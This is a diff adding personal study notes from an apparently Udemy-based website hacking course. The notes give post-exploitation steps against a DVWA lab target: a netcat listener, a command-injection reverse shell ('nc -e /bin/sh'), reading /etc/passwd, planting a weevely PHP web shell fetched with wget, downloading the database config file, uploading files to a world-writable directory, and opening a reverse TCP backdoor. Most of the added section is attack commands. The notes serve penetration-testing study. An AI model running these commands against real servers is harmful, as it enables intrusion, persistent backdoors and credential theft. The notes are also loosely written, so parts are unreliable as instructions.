@@ -1041,7 +1041,52 @@ Step 3 -> After scan is complete it will show u some results of spider when it w
 Step 4 -> Go to Path Traversal and then expand it select 1st vulnerability right click on it and then show option to show it
 	in browser and also XSS attacks executed, u can also take the URL and then use with beef or some other tool
 	
-Post Exploitation
+Post Exploitation ->
+Step 1 -> cmdL -> nc -vv -l -p 8888
+Step 2 -> cmdR -> Code Execution Vulnerbility -> 1.1.1.1; nc -e /bin/sh L_ip_addr 8888
+	cmdL(imp) -> whoami
+	cmdL -> uname -a
+	cmdL -> use pwd and cd to get to location /var/www
+	cmdL -> /etc/passwd
+	
+	Recrete File Upload in same hacking path and creating another session but this way 
+	cmdL -> cp weevely_payload.txt /var/www/html
+	cmdL -> service apache2 start
+	- On browser own_ip/weevely_payload.txt // it is important to see the code without any boundary or add or msg 
+	cmdL -> cd /var/www/dvwa/vulnerabilities // place to download the weevely payload
+	cmdL -> wget http://own_ip/weevely_payload.txt // to download file
+	- On the browser target_ip/dvwa/vulnerabilities/ // to check the payload
+	cmdL -> change the weevely_payload.txt to weevely_payload.php 
+	cmdL -> weevely http://target_ip/dvwa/vulnerabilities/weevely_payload.php 123456
+	cmdL -> weevely > :help
+	cmdL -> weevely > :system_info -h
+	cmdL -> weevely > cat /etc/passwd // use locations in the file to navigate through the server or use the cmd as 'audit'
+	cmdL -> weevely > :audit_etcpasswd // much preferable to be used then 'cat /etc/passwd' bcz sometimes it doesn't work
+	cmdL -> weevely > :audit_etcpasswd -h // to get more info by using flags
+	cmdL -> weevely > :audit_etcpasswd -vector posix_getpwuid // try others to bcz some will work and some don't
+	cmdL -> weevely > :shell_sh // it is used in case ur Linux cmds r not allowed to run so it helps to run them through the
+				// php function or python function
+	cmdL -> weevely > :shell_sh pwd 
+	cmdL -> weevely > :shell_sh -vector passthru whoami // try different available vectors to run the cmds
+	
+	cmdL -> weevely > cd /var/www/dvwa/config // mostly times config types contains data regarding the database
+	cmdL -> weevely > :file_download config.inc.php /root/config_download.txt // to download file from target server
+	cmdL -> weevely > file_upload (Screenshot(509))
+	cmdL -> weevely > to upload the files with nobody privilages
+			> cd /var/www on doing ls -al u will see directory named 'dav' which belongs to root user so this should be
+			the place to upload the file as being no body as it also as permissions for the chmod as 'drwxrwxrwt'
+			> cd dav then cmd -> :file_upload /root/file_to_upload ./file_to_upload_name // if response is true then the
+				// file got uploaded
+			> on the browser ip/dav/uploaded_filename.txt
+	cmdL -> weevely > :backdoor_reversetcp // Screenshot(510) // to have a direct connection from the target to ur system it is
+			// helpfull as it helps in bypassing many security measures
+	cmdL -> weevely > :backdoor_reversetcp -vector netcat own_ip 8080 // if we were not allowed to run cmds through weevely then
+			// now we can run them using netcat
+Link -> https://www.udemy.com/course/learn-website-hacking-penetration-testing-from-scratch/learn/lecture/6019926#overview
+	cmdL -> weevely > sql_dump -h and sql_console -h, Screenshot(511)
+Link -> https://www.udemy.com/course/learn-website-hacking-penetration-testing-from-scratch/learn/lecture/6019930#overview
+
+	
 --------------------------------------------------------------------------------------------------------------------------------
 
 - burp-suite-hacking-course-beginner-to-advance Udemy tutorial
